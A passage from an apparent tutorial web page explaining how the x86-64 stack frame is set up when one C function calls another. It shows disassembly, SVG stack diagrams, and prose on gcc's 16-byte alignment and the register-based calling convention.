</span></span><span class="line"><span class="cl">    <span class="err">1191:</span>       <span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">    <span class="err">1196:</span>       <span class="nf">e8</span> <span class="mi">7</span><span class="no">e</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">call</span>   <span class="mh">1119</span> <span class="p">&lt;</span><span class="no">func2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="err">119</span><span class="nl">b:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">10</span>             <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="err">119</span><span class="nl">f:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a2:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a3:</span>       <span class="nf">c9</span>                      <span class="no">leave</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a4:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p><code>func1()</code> will then store the previous (main function&rsquo;s) <code>rbp</code> value to stack.. and update the new base pointer with stack pointer&rsquo;s value. At this point our stack will look something like below:-</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 552 201"
      >
      <g transform='translate(8,16)'>
<circle cx='56' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='56' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='72' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='72' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='88' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='88' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='104' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='104' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='72' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='80' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='96' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='112' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='120' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='128' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='528' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='536' y='148' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>Now after the prologue instructions, the instruction pointer (<code>rip</code>) is at instruction <code>113f</code> &ndash;&gt; <code>sub    rsp,0x10</code>. This subtracts <code>0x10</code> from <code>rsp</code> that will increase the gap betweem <code>rbp</code> and <code>rsp</code> resulting in some memory space in the stack frame. This does not overwrite the stack values, but this will create a sense of cleaning the messed up stack.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 632 377"
      >
      <g transform='translate(8,16)'>
<path d='M 568,160 L 568,176' fill='none' stroke='currentColor'></path>
<path d='M 568,176 L 568,192' fill='none' stroke='currentColor'></path>
<path d='M 568,192 L 568,208' fill='none' stroke='currentColor'></path>
<path d='M 568,208 L 568,224' fill='none' stroke='currentColor'></path>
<circle cx='184' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='48' y='276' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='56' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='64' y='276' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='276' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='96' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='104' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='192' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='200' y='164' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='248' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='256' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='264' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='280' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='288' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='304' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='312' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='328' y='164' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='352' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='376' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='384' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='392' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='424' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='440' y='228' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='520' y='228' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='528' y='228' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='536' y='164' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='536' y='228' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='592' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='600' y='196' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='608' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='616' y='196' fill='currentColor' style='font-size:1em'>0</text>
</g>

    </svg>
  
</div>
<p>This allocated space is now used to create local variables for the function <code>func1()</code>&hellip; For our case, that will be <code>int x</code>. Integers use only 4 bytes of space for themselves, but <code>gcc</code> by default allocates memory in 16-bytes chunk. That is the reason for <code>rsp</code> to move <code>0x10</code> (16) bytes downwards. We can change this behaviour by explicitely passign  <code>-mpreferred-stack-boundary=n</code> flag to <code>gcc</code>. Read more about this <a href="https://stackoverflow.com/questions/1061818/stack-allocation-padding-and-alignment">here: Stack allocation, padding, and alignment</a></p>
<p>After the memory is allocated on stack for local variables, it is time to call func2 with all the arguments. According to the calling convention defined for x86 assembly instructions, whenever a function is called, it&rsquo;s arguments are first loaded into predefined registers in specific positional order. But due to limitations of general purpose registers, only first 6 arguments are loaded to registers and the rest are pushed to stack.</p>
<p>For this case, there are in total 8 arguments&hellip; out of which 6 will be stored in the general purpose registers and the rest 2 will be pushed to stack.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 600 377"
      >
      <g transform='translate(8,16)'>
<path d='M 536,160 L 536,176' fill='none' stroke='currentColor'></path>
<path d='M 536,176 L 536,192' fill='none' stroke='currentColor'></path>
<path d='M 536,192 L 536,208' fill='none' stroke='currentColor'></path>
<circle cx='152' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='152' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='168' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='168' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='0' y='276' fill='currentColor' style='font-size:1em'>L</text>
